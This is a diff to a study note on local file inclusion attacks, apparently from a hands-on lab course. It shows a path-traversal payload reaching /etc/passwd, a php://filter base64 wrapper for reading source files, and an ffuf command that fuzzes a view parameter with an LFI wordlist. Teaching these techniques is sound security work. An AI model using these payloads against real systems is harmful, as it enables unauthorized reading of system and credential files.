@@ -40,7 +40,7 @@ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do 
 # The filename can end with the .php extension or without it
 php://filter/read=convert.base64-encode/resource=<file>
 
-ffuf -u "http://154.57.164.82:32382/index.php?view=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1935
+ffuf -u 'http://$target:32382/index.php?view=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1935
 ```
 
 There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.
